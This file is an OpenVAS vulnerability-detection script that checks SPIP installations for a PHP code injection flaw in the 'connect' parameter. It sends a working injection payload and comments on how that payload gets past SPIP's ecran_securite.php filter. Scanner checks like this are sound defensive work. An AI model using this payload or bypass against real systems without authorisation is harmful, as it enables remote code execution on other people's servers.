###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_spip_54292.nasl 71 2013-11-21 12:11:40Z veerendragg $
#
# SPIP 'connect' Parameter PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.
Impact Level: Application/System";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103777";
CPE = "cpe:/a:spip:spip";

tag_insight = "SPIP contains a flaw that is triggered when input passed via the 'connect'
parameter is not properly sanitized before being used.";


tag_affected = "SPIP versions prior to 2.0.21, 2.1.16, and 3.0.3 are vulnerable. Other version may also affected.";
tag_summary = "SPIP is prone to a remote PHP code-injection vulnerability.";
tag_solution = "Vendor updates are available.";
tag_vuldetect = "Tries to execute the phpinfo() function by sending a HTTP POST request.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54292);
 script_cve_id("CVE-2013-4555", "CVE-2013-4556", "CVE-2013-4557");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 71 $");

 script_name("SPIP 'connect' Parameter PHP Code Injection Vulnerability");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54292");
 script_xref(name:"URL", value:"http://www.spip.net/en");
 script_xref(name:"URL", value:"http://www.securitytracker.com/id/1029317");
 
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-11-21 13:11:40 +0100 (Thu, 21 Nov 2013) $");
 script_tag(name:"creation_date", value:"2013-08-29 12:05:48 +0200 (Thu, 29 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_spip_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("spip/installed");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

host = get_host_name();

for(i=0;i<2;i++) { # sometimes there is no output from phpinfo() on the first request. So try twice...

  ex = 'connect=??>><?php phpinfo();#'; # there is a typo in ecran_securite.php (line 260) which makes str_replace() looking for the string "?>". With "??>>" we could bypass this workaround. Some installations also need to comment out all behind the command...
  len=strlen(ex);                       

  req = 'POST ' + dir + '/spip.php HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' + 
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' + 
        'Connection: close\r\n' + 
        '\r\n' + 
        ex;

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>phpinfo()</title>" >< result) {
  
    security_hole(port:port);
    exit(0);

  }  

}

exit(99);
